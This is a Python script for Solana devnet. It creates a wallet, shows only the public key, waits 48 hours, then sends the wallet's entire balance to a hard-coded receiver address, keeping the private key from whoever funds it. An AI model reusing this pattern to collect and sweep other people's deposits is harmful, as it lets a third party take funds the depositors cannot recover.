import base58
from solathon.core.instructions import transfer
from solathon import Client, Transaction, PublicKey, Keypair
from fetch_balance import fetch_wallet_balance  
import time

# Initialize Solana client (adjust if using mainnet or other networks)
client = Client("https://api.devnet.solana.com")

def generate_wallet():
    # Generate a new Solana Keypair
    account = Keypair()
    public_key = str(account.pubkey())
    private_key_bytes = account.secret()
    
    # Convert the private key to Base58
    private_key = base58.b58encode(private_key_bytes).decode('utf-8')
    
    # Print only the public key
    print(public_key)
    return public_key, private_key

def send_unless():
    # Generate a new wallet and get its public and private keys
    wallet_address, private_key = generate_wallet()
    
    # Sleep for 48 hours
    time.sleep(172800)

    # Fetch the wallet balance after the sleep period
    balance = fetch_wallet_balance(wallet_address)
    
    try:
        # Convert balance to float and then to Lamports
        balance_float = float(balance)
        balance_lamports = int(balance_float * 1e9)  # Convert SOL to Lamports
        
        if balance_float > 0:
            # Convert the private key from Base58 back to bytes
            private_key_bytes = base58.b58decode(private_key)
            sender = Keypair.from_secret_key(private_key_bytes)
            
            receiver = PublicKey("4fsYaTLhR2TAURyLjdrAY1pWNXp3Ww3F8K3KtNM7kcXH")
            
            # Use the entire balance
            amount = balance_lamports  # Correctly use the balance in Lamports
            
            # Prepare the transaction instruction
            instruction = transfer(
                from_public_key=sender.public_key,
                to_public_key=receiver, 
                lamports=amount
            )
            transaction = Transaction(instructions=[instruction], signers=[sender])

            try:
                # Send the transaction and handle the result
                result = client.send_transaction(transaction)
                print("Transaction response: ", result)
            except Exception as e:
                print("Transaction failed: ", e)
        else:
            print(f"No balance available: {balance}")
    
    except ValueError:
        print(f"Invalid balance format: {balance}")

if __name__ == "__main__":
    send_unless()  # Generate a wallet, wait 48 hours, and send funds if balance is available
